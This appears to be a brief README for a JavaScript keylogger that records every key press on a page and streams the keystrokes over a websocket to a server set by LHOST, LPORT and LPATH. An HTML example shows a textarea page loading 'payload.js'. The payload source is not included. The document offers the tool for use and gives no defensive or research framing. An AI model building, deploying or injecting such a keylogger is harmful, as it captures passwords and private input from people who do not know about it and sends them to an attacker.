# JavaScript Keylogger 

This keylogger logs any key presses and it will send  them to the server over a websocket. This makes it  efficient when bunch of clients are connected to a server.


#### example 


```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>JS-Keylogger</title>
	<script src="payload.js" defer></script>
</head>
<body>
	<textarea></textarea>

</body>
</html>
```

- You can also change the LHOST, LPORT, and LPATH which is the route to the websocket server.